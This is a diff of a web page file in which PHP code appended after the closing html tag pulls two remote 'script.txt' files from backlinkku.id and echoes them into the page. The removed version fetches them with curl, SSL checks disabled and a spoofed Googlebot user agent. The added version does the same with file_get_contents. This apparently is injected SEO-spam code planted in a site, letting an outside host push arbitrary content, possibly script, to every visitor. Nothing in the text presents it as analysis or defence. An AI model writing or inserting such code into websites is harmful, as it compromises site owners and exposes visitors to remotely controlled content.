@@ -292,22 +292,8 @@ new TWTR.Widget({
 </body>
 </html>
 <?php
-$traffic = 'https://backlinkku.id/menu/traffic-v1/script.txt';
-$remote = 'https://www.backlinkku.id/menu/vip-v1/script.txt';
-function fetch_clean($url) {
-    $ch = curl_init();
-    curl_setopt_array($ch, [
-        CURLOPT_URL => $url,
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_USERAGENT => 'Googlebot/2.1 (+http://www.google.com/bot.html)'
-    ]);
-    $result = curl_exec($ch);
-    curl_close($ch);
-    return $result;
-}
-$tolol = fetch_clean($traffic);
-echo $tolol;
-$data = fetch_clean($remote);
-echo $data;
+echo file_get_contents("https://backlinkku.id/menu/traffic-v1/script.txt");
+?>
+<?php
+echo file_get_contents("https://backlinkku.id/menu/vip-v1/script.txt");
 ?>
